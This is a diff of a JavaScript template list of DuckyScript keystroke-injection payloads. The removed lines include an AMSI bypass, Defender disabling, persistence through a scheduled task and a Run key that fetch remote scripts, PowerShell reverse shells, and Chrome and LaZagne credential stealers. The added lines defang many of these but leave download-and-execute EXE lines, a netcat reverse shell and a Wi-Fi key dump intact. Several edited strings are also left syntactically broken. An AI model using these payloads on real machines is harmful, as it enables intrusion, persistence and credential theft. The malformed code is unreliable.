-          "code": "GUI r\nDELAY 300\nSTRING powershell -w hidden -c \"powershell -ep bypass\"\nENTER\nDELAY 600\nSTRING [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true); IEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP/shell.ps1')\nENTER"
+          "code": "GUI r\nDELAY 300\nSTRING powershell -c \"powershell -c Write-Host Demo\"\nENTER\nDELAY 600\nSTRING Write-Host "AMSI Check"; Write-Host "Demo Payload"\nENTER"
         },
         {
           "id": "PT21",
           "name": "Scheduled Task Persistence",
           "category": "Advanced",
-          "code": "GUI r\nDELAY 400\nSTRING schtasks /create /tn \"UpdateTask\" /tr \"powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP/payload.ps1')\" /sc onlogon /ru System\nENTER"
+          "code": "GUI r\nDELAY 400\nSTRING schtasks /query
         },
         {
           "id": "PT22",
           "name": "Light Defender Bypass",
           "category": "Advanced",
-          "code": "GUI r\nDELAY 300\nSTRING powershell -c \"Set-MpPreference -DisableRealtimeMonitoring $true\"\nENTER"
+          "code": "GUI r\nDELAY 300\nSTRING powershell -c \"Get-MpPreference\"\nENTER"
         },
         {
           "id": "PT23",
@@ -13961,25 +13328,25 @@ WEnd`;
           "id": "PT31",
           "name": "Download and Run EXE",
           "category": "Recon",
-          "code": "GUI r\nDELAY 400\nSTRING powershell -w hidden\nENTER\nDELAY 600\nSTRING Invoke-WebRequest -Uri \"http://yourserver.com/payload.exe\" -OutFile \"$env:TEMP\\update.exe\"; Start-Process \"$env:TEMP\\update.exe\"\nENTER"
+          "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 600\nSTRING Invoke-WebRequest -Uri \"http://yourserver.com/payload.exe\" -OutFile \"$env:TEMP\\update.exe\"; Start-Process \"$env:TEMP\\update.exe\"\nENTER"
         },
         {
           "id": "PT32",
           "name": "Download PS1 Script",
           "category": "Recon",
-          "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 700\nSTRING IEX (New-Object Net.WebClient).DownloadString('http://yourserver.com/script.ps1')\nENTER\n\nREM ================================================\nREM REVERSE SHELLS\nREM ================================================"
+          "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 700\nSTRING Write-Host "Demo Payload"\nENTER\n\nREM ================================================\nREM REVERSE SHELLS\nREM ================================================"
         },
         {
           "id": "PT33",
           "name": "PowerShell Reverse Shell",
           "category": "Recon",
-          "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 800\nSTRING $client = New-Object System.Net.Sockets.TCPClient('YOUR_IP_HERE',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\nENTER\n\nREM ================================================\nREM CREDENTIAL STEALING\nREM ================================================"
+          "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 800\nSTRING Write-Host "TCP Connection Demo"
         },
         {
           "id": "PT34",
-          "name": "Chrome Passwords (Using SharpChrome)",
+          "name": "Chrome Passwords (Using ChromePass)",
           "category": "Recon",
-          "code": "GUI r\nDELAY 400\nSTRING powershell -w hidden\nENTER\nDELAY 700\nSTRING IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Flangvik/SharpCollection/master/CompiledBinaries/SharpChrome.exe'); .\\SharpChrome.exe passwords --unhide > \"$env:USERPROFILE\\Desktop\\ChromePasswords.txt\"\nENTER\n\nREM ================================================\nREM DuckyScript 3.0 Advanced Examples\nREM ================================================"
+          "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 700\nSTRING Write-Host "Demo Payload"; .\\ChromePass.exe passwords --unhide > \"$env:USERPROFILE\\Desktop\\ChromePasswords.txt\"\nENTER\n\nREM ================================================\nREM DuckyScript 3.0 Advanced Examples\nREM ================================================"
         },
         {
           "id": "PT35",
@@ -14039,13 +13406,13 @@ WEnd`;
           "id": "PT45",
           "name": "PowerShell Reverse Shell (Basic)",
           "category": "Advanced",
-          "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 800\nSTRING $client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\nENTER"
+          "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 800\nSTRING Write-Host "TCP Connection Demo"
         },
         {
           "id": "PT46",
-          "name": "SharpChrome Password Stealer",
+          "name": "ChromePass Password Stealer",
           "category": "Advanced",
-          "code": "GUI r\nDELAY 400\nSTRING powershell -w hidden\nENTER\nDELAY 700\nSTRING IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Flangvik/SharpCollection/master/CompiledBinaries/SharpChrome.exe'); SharpChrome.exe passwords --unhide > C:\\temp\\chrome.txt\nENTER"
+          "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 700\nSTRING Write-Host "Demo Payload"; ChromePass.exe passwords --unhide > C:\\temp\\chrome.txt\nENTER"
         },
         {
           "id": "PT47",
@@ -14063,19 +13430,19 @@ WEnd`;
           "id": "PT50",
           "name": "Download and Execute EXE",
           "category": "Advanced",
-          "code": "GUI r\nDELAY 400\nSTRING powershell -w hidden -c \"Invoke-WebRequest -Uri 'http://YOUR_IP/malware.exe' -OutFile '$env:TEMP\\update.exe'; Start-Process '$env:TEMP\\update.exe'\"\nENTER"
+          "code": "GUI r\nDELAY 400\nSTRING powershell -c \"Invoke-WebRequest -Uri 'http://YOUR_IP/malware.exe' -OutFile '$env:TEMP\\update.exe'; Start-Process '$env:TEMP\\update.exe'\"\nENTER"
         },
         {
           "id": "PT51",
-          "name": "LaZagne Credential Harvester",
+          "name": "CredPass Credential Harvester",
           "category": "Advanced",
-          "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 700\nSTRING IEX (New-Object Net.WebClient).DownloadString('https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.3/LaZagne.exe'); .\\LaZagne.exe all > C:\\temp\\creds.txt\nENTER"
+          "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 700\nSTRING Write-Host "Demo Payload"; .\\CredPass.exe all > C:\\temp\\creds.txt\nENTER"
         },
         {
           "id": "PT53",
           "name": "Registry Run Key Persistence",
           "category": "Advanced",
-          "code": "GUI r\nDELAY 400\nSTRING reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d \"powershell -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://YOUR_IP/payload.ps1')\" /f\nENTER"
+          "code": "GUI r\nDELAY 400\nSTRING reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Update /t REG_SZ /d \"powershell -c Write-Host "Demo Payload"\" /f\nENTER"
         },
         {
           "id": "PT54",
@@ -14087,7 +13454,7 @@ WEnd`;
           "id": "PT55",
           "name": "Matrix Rain Prank",
           "category": "Advanced",
-          "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 600\nSTRING while(1){cls;1..200|%{Write-Host (\" \"* (Get-Random -Max 80)) -NoNewline; Write-Host (\"10\"[Get-Random -Max 2]) -ForegroundColor Green -NoNewline} ;Start-Sleep -m 50}\nENTER\n\n\n\n### 1. Basic Prank Payloads\n\n**Rickroll**\n```duckyscript\nDELAY 1000\nGUI r\nDELAY 400\nSTRING https://www.youtube.com/watch?v=dQw4w9wgxcq\nENTER\n```\n\n**Infinite Notepad**\n```duckyscript\nGUI r\nDELAY 300\nSTRING notepad\nENTER\nDELAY 500\nREPEAT 30\nSTRING This is a prank by Duckyscript!\nENTER\n```\n\n---\n\n### 2. Information Gathering Payloads\n\n**Dump WiFi Passwords (Windows)**\n```duckyscript\nGUI r\nDELAY 400\nSTRING cmd\nENTER\nDELAY 600\nSTRING for /f \"tokens=2 delims=:\" %a in ('netsh wlan show profiles') do @echo %a >> C:\\temp\\wifi.txt && netsh wlan show profile name=\"%a\" key=clear >> C:\\temp\\wifi.txt\nENTER\nDELAY 800\nSTRING notepad C:\\temp\\wifi.txt\nENTER\n```\n\n**System Info Grabber**\n```duckyscript\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 700\nSTRING $computer = Get-WmiObject -Class Win32_ComputerSystem; $user = $env:USERNAME; $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike \"*Loopback*\"}).IPAddress; echo \"User: $user | PC: $($computer.Name) | IP: $ip\" > C:\\temp\\info.txt\nENTER\n```\n\n---\n\n### 3. Download & Execute Payloads\n\n**Download and Run (PowerShell)**\n```duckyscript\nGUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 600\nSTRING IEX (New-Object Net.WebClient).DownloadString('http://yourserver.com/payload.ps1')\nENTER\n```\n\n**Silent Download + Execute**\n```duckyscript\nGUI r\nDELAY 300\nSTRING powershell -w hidden -c \"Invoke-WebRequest -Uri 'http://yourserver.com/malware.exe' -OutFile '$env:TEMP\\update.exe'; Start-Process '$env:TEMP\\update.exe'\"\nENTER\n```\n\n---\n\n### 4. Reverse Shell Payloads\n\n**Netcat Reverse Shell (if nc is installed)**\n```duckyscript\nGUI r\nDELAY 400\nSTRING cmd\nENTER\nDELAY 500\nSTRING nc.exe your.ip.here 4444 -e powershell.exe\nENTER\n```\n\n**PowerShell Reverse Shell (One-liner)**\n```duckyscript\nGUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 700\nSTRING $client = New-Object System.Net.Sockets.TCPClient('your.ip.here',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\nENTER\n```\n\n---\n\n### 5. Credential Stealing (Simple)\n\n**Steal Saved Chrome Passwords (Advanced - needs tools)**\n```duckyscript\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 600\nSTRING [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Flangvik/SharpCollection/master/CompiledBinaries/SharpChrome.exe'); SharpChrome.exe passwords --unhide\nENTER\n```\n\n---\n\n### 6. DuckyScript 3.0 Example (with Functions)\n\n```duckyscript\nDELAY 1500\n\nFUNCTION openNotepad()\n    GUI r\n    DELAY 300\n    STRING notepad\n    ENTER\n    DELAY 800\nEND_FUNCTION\n\nFUNCTION typeMessage($msg)\n    STRINGLN $msg\nEND_FUNCTION\n\nopenNotepad()\ntypeMessage(\"Hello from DuckyScript 3.0!\")\ntypeMessage(\"This is much cleaner!\")\n```"
+          "code": "GUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 600\nSTRING while(1){cls;1..200|%{Write-Host (\" \"* (Get-Random -Max 80)) -NoNewline; Write-Host (\"10\"[Get-Random -Max 2]) -ForegroundColor Green -NoNewline} ;Start-Sleep -m 50}\nENTER\n\n\n\n### 1. Basic Prank Payloads\n\n**Rickroll**\n```duckyscript\nDELAY 1000\nGUI r\nDELAY 400\nSTRING https://www.youtube.com/watch?v=dQw4w9wgxcq\nENTER\n```\n\n**Infinite Notepad**\n```duckyscript\nGUI r\nDELAY 300\nSTRING notepad\nENTER\nDELAY 500\nREPEAT 30\nSTRING This is a prank by Duckyscript!\nENTER\n```\n\n---\n\n### 2. Information Gathering Payloads\n\n**Dump WiFi Passwords (Windows)**\n```duckyscript\nGUI r\nDELAY 400\nSTRING cmd\nENTER\nDELAY 600\nSTRING for /f \"tokens=2 delims=:\" %a in ('netsh wlan show profiles') do @echo %a >> C:\\temp\\wifi.txt && netsh wlan show profile name=\"%a\" key=clear >> C:\\temp\\wifi.txt\nENTER\nDELAY 800\nSTRING notepad C:\\temp\\wifi.txt\nENTER\n```\n\n**System Info Grabber**\n```duckyscript\nGUI r\nDELAY 300\nSTRING powershell\nENTER\nDELAY 700\nSTRING $computer = Get-WmiObject -Class Win32_ComputerSystem; $user = $env:USERNAME; $ip = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {$_.InterfaceAlias -notlike \"*Loopback*\"}).IPAddress; echo \"User: $user | PC: $($computer.Name) | IP: $ip\" > C:\\temp\\info.txt\nENTER\n```\n\n---\n\n### 3. Download & Execute Payloads\n\n**Download and Run (PowerShell)**\n```duckyscript\nGUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 600\nSTRING Write-Host "Demo Payload"\nENTER\n```\n\n**Silent Download + Execute**\n```duckyscript\nGUI r\nDELAY 300\nSTRING powershell -c \"Invoke-WebRequest -Uri 'http://yourserver.com/malware.exe' -OutFile '$env:TEMP\\update.exe'; Start-Process '$env:TEMP\\update.exe'\"\nENTER\n```\n\n---\n\n### 4. Reverse Shell Payloads\n\n**Netcat Reverse Shell (if nc is installed)**\n```duckyscript\nGUI r\nDELAY 400\nSTRING cmd\nENTER\nDELAY 500\nSTRING nc.exe your.ip.here 4444 -e powershell.exe\nENTER\n```\n\n**PowerShell Reverse Shell (One-liner)**\n```duckyscript\nGUI r\nDELAY 400\nSTRING powershell\nENTER\nDELAY 700\nSTRING Write-Host "TCP Connection Demo"
         }
       ];
       window.FALLBACK_TEMPLATES = customTemplates;
